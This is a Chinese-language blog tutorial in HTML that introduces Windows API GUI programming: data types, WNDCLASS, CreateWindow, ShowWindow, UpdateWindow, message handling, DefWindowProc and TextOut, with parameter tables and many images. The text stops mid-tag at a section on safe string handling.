        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">XP:Windows NT5.1WIN7:Windows NT6.1WIN8:WindowsNT6.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows API 是Windows操作系统提供给应用程序的大量函数，开发程序调用这些接口，可以搭建各种各样不同的程序</p><h2 id="Windows-API结构"><a href="#Windows-API结构" class="headerlink" title="Windows API结构"></a>Windows API结构</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110659.png" alt="image-20211109191615483"></p><h2 id="Windows-API数据类型"><a href="#Windows-API数据类型" class="headerlink" title="Windows API数据类型"></a>Windows API数据类型</h2><p>Windows API的数据类型是不同于C或者C++的数据类型的 ，它有一套属于自己的数据类型。</p><p>同时，这两者之前又有一些关系。比如，部分数据类型是由标准C当中重定义而来，而有些是Windows 特有的。</p><p>  其中，自定义规则遵循如下情况：</p><ol><li>基本类型大写：即char 类型 改变为CHAR</li><li>指针类型在其指向数据类型前添加<code>LP</code>或<code>P</code>即：DWORD的指针类型为<code>LPDWORD</code>和<code>PDWORD</code></li><li>句柄类型命名方式一般在对象前添加<code>H</code></li><li>无符号类型一般是以<code>U</code>开头，即：<code>INT</code>是符号类型，<code>UINT</code>则是无符号类型</li></ol><p>控制台应用</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110661.png" alt="image-20211030010746839"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110662.png" alt="image-20211030010927880"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110663.png" alt="image-20211030011127891"></p><p>C语言中的宽字符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110664.png" alt="image-20211030011833710"></p><h2 id="另一种形式"><a href="#另一种形式" class="headerlink" title="另一种形式"></a>另一种形式</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110665.png" alt="image-20211030012042243"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110666.png" alt="image-20211030013338814"></p><p>丰富窗口个性化特征</p><pre class="line-numbers language-none"><code class="language-none">CreateWindow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110667.png" alt="image-20211030014530218"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110668.png" alt="image-20211030014934817"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110669.png" alt="image-20211030015143801"></p><h2 id="窗口的诞生流程"><a href="#窗口的诞生流程" class="headerlink" title="窗口的诞生流程"></a>窗口的诞生流程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110670.png" alt="image-20211030145050676"></p><h3 id="WNDCLASS-结构"><a href="#WNDCLASS-结构" class="headerlink" title="WNDCLASS 结构"></a>WNDCLASS 结构</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p> Windows 的窗口总是基于窗口类来创建的，窗口类同时确定了处理窗口消息的窗口过程（回调函数）</p><p> 在创建应用程序窗口之前，必须调用 RegisterClass 函数来注册窗口类。该函数只需要一个参数，即指向 WNDCLASS 窗口类的指针。</p><p>因为 WNDCLASS 类包含了窗口所拥有的基本属性。</p><h4 id="结构原型"><a href="#结构原型" class="headerlink" title="结构原型"></a>结构原型</h4><pre class="line-numbers language-none"><code class="language-none">typedef struct tagWNDCLASSW {UINT        style;                 //指定窗口类型，有各种类风格可以使用按位或操作符组合起来WNDPROC     lpfnWndProc;           //指定窗口过程（必须是回调函数）int         cbClsExtra;            //预留的额外空间，一般为 0int         cbWndExtra;            //预留的额外空间，一般为 0HINSTANCE   hInstance;             //应用程序的实例句柄HICON       hIcon;                 //为所有基于该窗口类的窗口设定一个图标HCURSOR     hCursor;               //为所有基于该窗口类的窗口设定一个鼠标指针HBRUSH      hbrBackground;         //指定窗口背景色LPCWSTR     lpszMenuName;         //指定窗口菜单LPCWSTR     lpszClassName;        //指定窗口类名} WNDCLASSW, *PWNDCLASSW, NEAR *NPWNDCLASSW, FAR *LPWNDCLASSW;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="style-类风格"><a href="#style-类风格" class="headerlink" title="style 类风格"></a>style 类风格</h4><table><thead><tr><th>CS_VREDRAW</th><th>移动或者调整窗口的高度（垂直方向）时，重绘整个窗口</th></tr></thead><tbody><tr><td>CS_HREDRAW</td><td>移动或者调整窗口的宽度（水平方向）时，重绘整个窗口</td></tr><tr><td>CS_DBLCLKS</td><td>当用户光标在窗口内双击时，允许发送双击消息给窗口过程</td></tr><tr><td>CS_OWNDC</td><td>给予每个窗口实例分配一个唯一的 DC（注意，尽管这样是很方便，但它必须慎重使用，因为每个 DC 大约要占 800 个字节的内存）</td></tr><tr><td>CS_CLASSDC</td><td>该窗口类的所有窗口实例都共享一个窗口类 DC</td></tr><tr><td>CS_PARENTDC</td><td>1. 将子窗口的裁剪区域设置到父窗口的 DC 中去，这样子窗口便可以在父窗口上绘制自身。（注意，这是子窗口从系统缓存中获取 DC，而不是使用父窗口的 DC。）  2. 指定该风格可以提高系统性能</td></tr><tr><td>CS_NOCLOSE</td><td>禁止系统菜单的关闭选项</td></tr><tr><td>CS_SAVEBITS</td><td>1. 以位图形式保存被该窗口遮挡的屏幕部分，当给窗口移动以后，系统便可以用该保存的位图恢复屏幕移动的相应部分，从而系统不用向被该窗口遮挡的窗口发送 WM_PAINT 消息  2. 该特性对于菜单类型的窗口比较合适，因为它通常是简短的显示一下之后便消失  3. 设置该特性将增加显示该窗口的时间，因为它通常要先分配保存位图的内存</td></tr><tr><td>CS_BYTEALIGNCLIENT</td><td>在字节边界上（在 x 方向上）定位窗口的用户区域的位置</td></tr><tr><td>CS_BYTEALIGNWINDOW</td><td>在字节边界上（在 x 方向上）定位窗口的位置</td></tr><tr><td>CS_GLOBALCLASS</td><td>1. 当调用 CreateWindow 或 CreateWindowEx 函数来创建窗口时允许它的 hInstance 参数和注册窗口类时传递给 RegisterClass 的 hInstance 参数不同  2. 如果不指定该风格，则这两个 hInstance 必须相同</td></tr></tbody></table><h3 id="CreateWindow"><a href="#CreateWindow" class="headerlink" title="CreateWindow"></a>CreateWindow</h3><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p>CreateWindow 函数创建一个重叠式窗口、弹出式窗口或子窗口。它指定窗口类，窗口标题，窗口风格，以及窗口的初始位置及大小（可选的）。函数也指该窗口的父窗口或所属窗口（如果存在的话），及窗口的菜单。</p><p> 若要使用除 CreateWindow 函数支持的风格外的扩展风格，则使用 CreateWindowEx 函数代替 CreateWindow 函数。</p><h4 id="API原型"><a href="#API原型" class="headerlink" title="API原型"></a>API原型</h4><p>注：<code>_In_ </code>说明该参数是输入的，<code>_opt_ </code>说明该参数是可选参数</p><pre class="line-numbers language-none"><code class="language-none">HWND WINAPI CreateWindow(_In_opt_  LPCTSTR lpClassName,    // 窗口类名称_In_opt_  LPCTSTR lpWindowName,   // 窗口标题_In_      DWORD dwStyle,          // 窗口风格，或称窗口格式_In_      int x,                  // 初始 x 坐标_In_      int y,                  // 初始 y 坐标_In_      int nWidth,             // 初始 x 方向尺寸_In_      int nHeight,            // 初始 y 方向尺寸_In_opt_  HWND hWndParent,        // 父窗口句柄_In_opt_  HMENU hMenu,            // 窗口菜单句柄_In_opt_  HINSTANCE hInstance,    // 程序实例句柄_In_opt_  LPVOID lpParam          // 创建参数);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>核心元素：<code>IpParam</code>–&gt;用来<code>绑定</code>注册窗口类的指针</p><h4 id="具体参数解析"><a href="#具体参数解析" class="headerlink" title="具体参数解析"></a>具体参数解析</h4><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>lpClassName</td><td>1. 窗口类名称，可以是一个指向 NULL 结束的字符串或一个整型数值  2. 如果是字符串，它指定了窗口的类名。这个类名可以是任何用函数 RegisterClass 注册的类名，或是任何预定义的控制类名  3. 如是一个整型量，它是由此前调用 theGlobalAddAtom 函数产生的全局量。这个小于 0xC000 的 16 位数必须是 lpClassName 参数字的低 16 位，该参数的高位必须是 0</td></tr><tr><td>lpWindowName</td><td>1. 窗口标题，一个指向 NULL 结束的字符串指针  2. 如果窗口风格指定了标题条，由 lpWindowName 指向的窗口标题将显示在标题条上  3. 当使用 Createwindow 函数来创建控制例如按钮，选择框和静态控制时，可使用 lpWindowName 来指定控制文本</td></tr><tr><td>dwStyle</td><td>指定创建窗口的风格（详见下方↓）</td></tr><tr><td>x</td><td>1. 指定窗口的初始水平位置（x 坐标）  2. 对一个层叠或弹出式窗口，x 参数是屏幕坐标系的窗口的左上角的初始 x 坐标  3. 对于子窗口，x 是子窗口左上角相对父窗口客户区左上角的初始 x 坐标  4. 如果该参数被设为 CW_USEDEFAULT 则系统为窗口选择缺省的左上角坐标并忽略 y 参数，CW_USEDEFAULT 只对层叠窗口有效，如果为弹出式窗口或子窗口设定，则 x 和 y 参数被设为零。</td></tr><tr><td>y</td><td>1. 指定窗口的初始垂直位置（y 坐标）  2. 对一个层叠或弹出式窗口，y 参数是屏幕坐标系的窗口的左上角的初始 y 坐标  3. 对于子窗口，y 是子窗口左上角相对父窗口客户区左上角的初始 y 坐标  4. 对于列表框，y 是列表框客户区左上角相对父窗口客户区左上角的初始 y 坐标  5. 如果层叠窗口是使用 WS_VISIBLE 风格位创建的并且 x 参数被设为 CW_USEDEFAULT，则系统将忽略 y 参数</td></tr><tr><td>nWidth</td><td>1. 以设备单元指明窗口的宽度  2. 对于层叠窗口，nWidth 的值或是屏幕坐标的窗口宽度或是 CW_USEDEFAULT  3. 若 nWidth 是 CW_USEDEFAULT，则系统为窗口选择一个默认的高度和宽度（默认宽度为从初始 x  坐标开始到屏幕的右边界，缺省高度为从初始 y 坐标开始到目标区域的顶部。)，CW_USEDEFAULT  只对层叠窗口有效，如果为弹出式窗口和子窗口设定 CW_USEDEFAULT 标志则 nWidth 和 nHeight 被设为零</td></tr><tr><td>nHeight</td><td>1. 以设备单元指明窗口的高度  2. 对于层叠窗口，nHeight 是屏幕坐标的窗口宽度  3. 若 nWidth 被设为 CW_USEDEFAULT，则系统忽略 nHeight 参数，自动为 nWidth 和 nHeight 设置默认参数</td></tr><tr><td>hWndParent</td><td>1. 指向被创建窗口的父窗口或所有者窗口的句柄  2. 若要创建一个子窗口或一个从属窗口，需提供一个有效的窗口句柄  3. 创建一个单纯的消息窗口，可以提供 HWND_MESSAGE 或提供一个己存在的消息窗口的句柄</td></tr><tr><td>hMenu</td><td>1. 指向窗口菜单句柄，或依据窗口风格指明一个子窗口标识  2. 对于层叠或弹出式窗口，hMenu 指定窗口使用的菜单：如果使用了菜单类，则 hMenu 可以为 NULL  3. 对于子窗口，hMenu 指定了该子窗口标识（一个整型量），一个对话框使用这个整型值将事件通知父类。应用程序确定子窗口标识，这个值对于相同父窗口的所有子窗口必须是唯一的</td></tr><tr><td>hInstance</td><td>与窗口相关联的模块实例的句柄</td></tr><tr><td>lpParam</td><td>1. 指向一个值的指针，该值传递给窗口 WM_CREATE 消息。该值通过在 lParam 参数中的 CREATESTRUCT 结构传递  2. 如果应用程序调用 CreateWindow 创建一个 MDI 客户窗口，则 lpParam 必须指向一个 CLIENTCREATESTRUCT 结构</td></tr></tbody></table><h4 id="dwStyle-窗口风格解析"><a href="#dwStyle-窗口风格解析" class="headerlink" title="dwStyle 窗口风格解析"></a>dwStyle 窗口风格解析</h4><table><thead><tr><th><strong>窗口风格</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>WS_BORDER</td><td>创建一个带边框的窗口</td></tr><tr><td>WS_CAPTION</td><td>创建一个有标题框的窗口（包含了 WS_BODER 风格）</td></tr><tr><td>WS_CHILD</td><td>创建一个子窗口，这个风格的窗口不能拥有菜单也不能与 WS_POPUP 风格合用</td></tr><tr><td>WS_CHILDWINDOW</td><td>与 WS_CHILD 相同</td></tr><tr><td>WS_CLIPCHILDREN</td><td>当在父窗口内绘图时，排除子窗口区域，在创建父窗口时使用这个风格</td></tr><tr><td>WS_CLIPSIBLINGS</td><td>1. 排除子窗口之间的相对区域，也就是，当一个特定的窗口接收到 WM_PAINT 消息时，WS_CLIPSIBLINGS 风格将所有层叠窗口排除在绘图之外，只重绘指定的子窗口  2. 如果未指定该风格，并且子窗口是层叠的，则在重绘子窗口的客户区时，就会重绘邻近的子窗口</td></tr><tr><td>WS_DISABLED</td><td>1. 创建一个初始状态为禁止的子窗口，一个禁止状态的窗口不能接受来自用户的输入信息  2. 在窗口创建之后，可以调用 EnableWindow 函数来启用该窗口</td></tr><tr><td>WS_DLGFRAME</td><td>创建一个带对话框边框风格的窗口，这种风格的窗口不能带标题条</td></tr><tr><td>WS_GROUP</td><td>1. 指定一组“控制窗口”的第一个“控制窗口”  2. 这个“控制窗口”组由第一个“控制窗口”和随后定义的“控制窗口”组成，自第二个“控制窗口”开始每个“控制窗口”具有 WS_GROUP 风格  3. 每个组的第一个“控制窗口”带有 WS_TABSTOP 风格，从而使用户可以在组间移动  4. 用户随后可以使用光标在组内的控制间改变键盘焦点</td></tr><tr><td>WS_HSCROLL</td><td>创建一个有水平滚动条的窗口</td></tr><tr><td>WS_ICONIC</td><td>创建一个初始状态为最小化状态的窗口，与 WS_MINIMIZE 风格相同</td></tr><tr><td>WS_MAXIMIZE</td><td>创建一个初始状态为最大化状态的窗口</td></tr><tr><td>WS_MAXIMIZEBOX</td><td>创建一个具有最大化按钮的窗口，该风格不能与 WS_EX_CONTEXTHELP 风格同时出现，同时必须指定 WS_SYSMENU 风格</td></tr><tr><td>WS_MINIMIZE</td><td>创建一个初始状态为最小化状态的窗口，与 WS_ICONIC 风格相同</td></tr><tr><td>WS_MINIMIZEBOX</td><td>创建一个具有最小化按钮的窗口，该风格不能与 WS_EX_CONTEXTHELP 风格同时出现，同时必须指定 WS_SYSMENU 风格</td></tr><tr><td>WS_OVERLAPPED</td><td>产生一个层叠的窗口，一个层叠的窗口有一个标题条和一个边框，与 WS_TILED 风格相同</td></tr><tr><td>WS_OVERLAPPEDWINDOW</td><td>相当于（WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX），与 WS_TILEDWINDOW 风格相同</td></tr><tr><td>WS_POPUP</td><td>创建一个弹出式窗口，该风格不能与 WS_CHILD 风格同时使用。</td></tr><tr><td>WS_POPUPWINDOW</td><td>相当于（WS_POPUP | WS_BORDER | WS_SYSMENU），但 WS_CAPTION 和 WS_POPUPWINDOW 必须同时设定才能使窗口某单可见</td></tr><tr><td>WS_SIZEBOX</td><td>创建一个可调边框的窗口，与 WS_THICKFRAME 风格相同</td></tr><tr><td>WS_SYSMENU</td><td>创建一个在标题条上带有窗口菜单的窗口，必须同时设定 WS_CAPTION 风格</td></tr><tr><td>WS_TABSTOP</td><td>1. 创建一个“控制窗口”，在用户按下 Tab 键时可以获得键盘焦点。  2. 按下 Tab 键后使键盘焦点转移到下一具有 WS_TABSTOP 风格的“控制窗口”</td></tr><tr><td>WS_THICKFRAME</td><td>创建一个具有可调边框的窗口，与 WS_SIZEBOX 风格相同</td></tr><tr><td>WS_TILED</td><td>产生一个层叠的窗口，一个层叠的窗口有一个标题和一个边框，与 WS_OVERLAPPED 风格相同</td></tr><tr><td>WS_TILEDWINDOW</td><td>相当于（WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX），与 WS_OVERLAPPEDWINDOW 风格相同</td></tr><tr><td>WS_VISIBLE</td><td>创建一个初始状态为可见的窗口</td></tr><tr><td>WS_VSCROLL</td><td>创建一个有垂直滚动条的窗口</td></tr></tbody></table><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><pre class="line-numbers language-none"><code class="language-none">1. 如果函数成功，返回值为新窗口的句柄；2. 如果函数失败，返回值为 NULL。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ShowWindow"><a href="#ShowWindow" class="headerlink" title="ShowWindow"></a>ShowWindow</h3><h4 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h4><p> ShowWindow 函数用于设置窗口的显示状态</p><p>应用程序第一次调用 ShowWindow 时，应该使用 WinMain 函数的 nCmdshow 参数作为它的 nCmdShow  参数。</p><p>在随后调用 ShowWindow 函数时，必须使用下列显示方式中的一个给定值，而不是由 WinMain 函数的 nCmdSHow 参数指定的值。</p><h4 id="API-函数原型"><a href="#API-函数原型" class="headerlink" title="API 函数原型"></a>API 函数原型</h4><pre class="line-numbers language-none"><code class="language-none">BOOL WINAPI ShowWindow(_In_  HWND hWnd,_In_  int nCmdShow);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="具体参数解析-1"><a href="#具体参数解析-1" class="headerlink" title="具体参数解析"></a>具体参数解析</h4><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>hWnd</td><td>窗口句柄</td></tr><tr><td>nCmdShow</td><td>控制窗口如何显示，如果发送应用程序的程序提供了 STARTUPINFO 结构，则应用程序第一次调用 ShowWindow 时该参数被忽略。否则，在第一次调用 ShowWindow 函数时，该值应为在函数 WinMain 中 nCmdShow 参数。</td></tr></tbody></table><p><strong>在随后的调用中，nCmdShow 参数可以为下列值之一：</strong></p><table><thead><tr><th><strong>显示方式</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>SW_FORCEMINIMIZE</td><td>1. 最小化窗口，即使拥有窗口的线程被挂起也会最小化  2. 在从其他线程最小化窗口时才使用这个参数</td></tr><tr><td>SW_HIDE</td><td>隐藏窗口并激活其他窗口</td></tr><tr><td>SW_MAXIMIZE</td><td>最大化指定的窗口</td></tr><tr><td>SW_MINIMIZE</td><td>最小化指定的窗口并且激活在 Z 序中的下一个顶层窗口</td></tr><tr><td>SW_RESTORE</td><td>1. 激活并显示窗口  2. 如果窗口最小化或最大化，则系统将窗口恢复到原来的尺寸和位置  3. 在恢复最小化窗口时，应用程序应该指定这个标志。</td></tr><tr><td>SW_SHOW</td><td>在窗口原来的位置以原来的尺寸激活并显示窗口</td></tr><tr><td>SW_SHOWDEFAULT</td><td>依据在 STARTUPINFO 结构中指定的 SW_FLAG 标志设定显示状态，STARTUPINFO 结构是由启动应用程序的程序传递给 CreateProcess 函数的。</td></tr><tr><td>SW_SHOWMAXIMIZED</td><td>激活窗口并将其最大化</td></tr><tr><td>SW_SHOWMINIMIZED</td><td>激活窗口并将其最小化</td></tr><tr><td>SW_SHOWMINNOACTIVE</td><td>1. 窗口最小化  2. 在窗口激活的情况下，这个值跟 SW_SHOWMINIMIZED 很相似</td></tr><tr><td>SW_SHOWNA</td><td>1. 以窗口原来的位置以原来的尺寸显示窗口  2. 在窗口激活的情况下，这个值跟 SW_SHOW 很相似</td></tr><tr><td>SW_SHOWNOACTIVATE</td><td>1. 以窗口最近一次的位置和尺寸显示窗口  2. 在窗口激活的情况下，这个值跟 SW_SHOWNORMAL 很相似</td></tr><tr><td>SW_SHOWNORMAL</td><td>1. 激活并显示一个窗口  2. 如果窗口被最小化或最大化，系统将其恢复到原来的尺寸和大小  3. 应用程序在第一次显示窗口的时候应该指定此标志</td></tr></tbody></table><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><pre class="line-numbers language-none"><code class="language-none">1. 如果窗口之前可见，则返回值为非 0；2. 如果窗口之前被隐藏，则返回值为 0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="UpdateWindow"><a href="#UpdateWindow" class="headerlink" title="UpdateWindow"></a>UpdateWindow</h3><h4 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h4><p>UpdateWindow 函数绕过应用程序的消息队列，直接发送 WM_PAINT 消息给指定窗口的窗口过程。</p><p> 如果窗口更新的区域不为空，UpdateWindow 函数通过发送一个 WM_PAINT 消息来更新指定窗口的客户区。如果更新区域为空，则不发送消息。</p><h4 id="API-函数原型-1"><a href="#API-函数原型-1" class="headerlink" title="API 函数原型"></a>API 函数原型</h4><pre class="line-numbers language-none"><code class="language-none">BOOL UpdateWindow(_In_  HWND hWnd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h4><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>hWnd</td><td>指定要更新的窗口的句柄.</td></tr></tbody></table><h4 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h4><pre class="line-numbers language-none"><code class="language-none">1. 如果函数调用成功，返回值为非 0；2. 如果函数调用不成功，返回值为 0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110671.png" alt="image-20211030145250670"></p><h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><p>Windows 应用程序都是<code>消息（事件）驱动</code>的，任何一个窗口都能够接收消息，并对该消息做出相应的处理。Windows系统和应用程序均可产生消息。任何一个动作都会产生，比如：<code>点击</code>，<code>移动鼠标</code>，<code>改变窗口大小</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110672.png" alt="image-20211030145710677"></p><h2 id="三点补充"><a href="#三点补充" class="headerlink" title="三点补充"></a>三点补充</h2><p>注：FIFO–&gt;先进先出</p><p>非队列化消息 会绕过消息队列 进行**”插队”**</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110673.png" alt="image-20211030150414619"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110674.png" alt="image-20211030150346598"></p><p>不关注的消息 会丢给</p><pre class="line-numbers language-none"><code class="language-none">DefWindowProc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="客户区和非客户区"><a href="#客户区和非客户区" class="headerlink" title="客户区和非客户区"></a>客户区和非客户区</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110675.png" alt="image-20211030150920737"></p><h2 id="绘制客户区"><a href="#绘制客户区" class="headerlink" title="绘制客户区"></a>绘制客户区</h2><h3 id="WNDPROC"><a href="#WNDPROC" class="headerlink" title="WNDPROC"></a>WNDPROC</h3><p>WNDPROC是一个函数指针，指向窗口过程函数</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><pre class="line-numbers language-none"><code class="language-none">WNDPROC是一个函数指针，指向窗口过程函数。其定义结构如下：typedef LRESULT (CALLBACK* WNDPROC)(HWND,UINT,WPARAM,LPARAM);// HWND:窗口句柄//UINT:消息ID//WPARAM:附加消息信息，uMsg参数//LPARAM：附加消息信息，uMsg参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110676.png" alt="image-20211030151313380"></p><p>客户区</p><pre class="line-numbers language-none"><code class="language-none">绘画初始化获得客户区的位置坐标信息WM_PAINT:处理窗口创建的消息WM_DESTROY:处理窗口关闭的消息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">响应鼠标左键的消息:WM_LBUTTONDOWN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">DOWN 和 UP 的区别<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110677.png" alt="image-20211030151926331"></p><h2 id="窗口销毁"><a href="#窗口销毁" class="headerlink" title="窗口销毁"></a>窗口销毁</h2><h3 id="DefWindowProc"><a href="#DefWindowProc" class="headerlink" title="DefWindowProc"></a>DefWindowProc</h3><h4 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h4><p>DefWindowProc 函数调用默认的窗口过程来处理我们不感兴趣的任何消息，该函数是为了确保每个消息都被处理。</p><p>DefWindowProc 函数传入和窗口过程同样的参数。</p><h4 id="API-函数原型-2"><a href="#API-函数原型-2" class="headerlink" title="API 函数原型"></a>API 函数原型</h4><pre class="line-numbers language-none"><code class="language-none">LRESULT WINAPI DefWindowProc(_In_  HWND hWnd,_In_  UINT Msg,_In_  WPARAM wParam,_In_  LPARAM lParam);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参数解析-1"><a href="#参数解析-1" class="headerlink" title="参数解析"></a>参数解析</h4><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>hWnd</td><td>指定接收消息的窗口句柄</td></tr><tr><td>Msg</td><td>1. 消息的标识符，由于数值不便于记忆，所以 Windows 将消息对应的数值定义为 WM_XXX 宏的形式  2. 应用程序消息只能使用低 16 位，高 16 位被系统保留  3. 传送门：<a href="http://bbs.fishc.com/thread-47244-1-1.html">Windows 常用消息及含义</a></td></tr><tr><td>wParam</td><td>指定消息的附加消息，确切的含义取决于消息成员的值</td></tr><tr><td>lParam</td><td>指定消息的附加消息，确切的含义取决于消息成员的值</td></tr></tbody></table><h4 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h4><pre class="line-numbers language-none"><code class="language-none">返回值就是消息处理结果，它取决于发送的消息。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110678.png" alt="image-20211030152838347"></p><h2 id="调用自己写的函数流程"><a href="#调用自己写的函数流程" class="headerlink" title="调用自己写的函数流程"></a>调用自己写的函数流程</h2><p>发送消息给Windows–&gt;Windows通过消息间接调用函数</p><h2 id="抢占式多任务环境"><a href="#抢占式多任务环境" class="headerlink" title="抢占式多任务环境"></a>抢占式多任务环境</h2><h2 id="三大核心部件"><a href="#三大核心部件" class="headerlink" title="三大核心部件"></a>三大核心部件</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110679.png" alt="image-20211030153645485"></p><h2 id="设备环境"><a href="#设备环境" class="headerlink" title="设备环境"></a>设备环境</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110680.png" alt="image-20211030153900950"></p><h2 id="获取设备环境句柄"><a href="#获取设备环境句柄" class="headerlink" title="获取设备环境句柄"></a>获取设备环境句柄</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110681.png" alt="image-20211030153950285"></p><h2 id="TextOut"><a href="#TextOut" class="headerlink" title="TextOut"></a>TextOut</h2><h3 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h3><p>TextOut 函数使用当前选择的字体、背景颜色和文本颜色，将一个字符串绘制于窗口的指定位置。</p><p>注：默认是左上角</p><h3 id="API-函数原型-3"><a href="#API-函数原型-3" class="headerlink" title="API 函数原型"></a>API 函数原型</h3><p> 注释：<code>_In_ </code>说明该参数是输入的，<code>_opt_ </code>说明该参数是可选参数</p><pre class="line-numbers language-none"><code class="language-none">BOOL TextOut(_In_  HDC hdc,_In_  int nXStart,_In_  int nYStart,_In_  LPCTSTR lpString,_In_  int cchString);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参数解析-2"><a href="#参数解析-2" class="headerlink" title="参数解析"></a>参数解析</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>hdc</td><td>设备环境句柄</td></tr><tr><td>nXStart</td><td>指定用于字符串对齐的基准点的逻辑 x 坐标（有关基准点请看下边备注）</td></tr><tr><td>nYStart</td><td>指定用于字符串对齐的基准点的逻辑 y 坐标</td></tr><tr><td>lpString</td><td>1. 指向将被绘制字符串的指针  2. 该字符串不必以’\0’结束，因为 cchString 参数指定了该字符串的长度</td></tr><tr><td>cchString</td><td>lpString 字符串的长度（有多少个字符）</td></tr></tbody></table><h3 id="返回值-4"><a href="#返回值-4" class="headerlink" title="返回值"></a>返回值</h3><pre class="line-numbers language-none"><code class="language-none">1. 如果函数调用成功，返回值为非 02. 如果函数调用失败，返回值为 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110682.png" alt="image-20211030154223181"></p><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110683.png" alt="image-20211030172936167"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110684.png" alt="image-20211030173253347"></p><p>注：</p><pre class="line-numbers language-none"><code class="language-none">lstrlen:获得字符个数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安全的字符串处理"><a href="#安全的字符串处理" class="headerlink" title="安全的字符串处理"></a>安全的字符串处理</h2><p><img 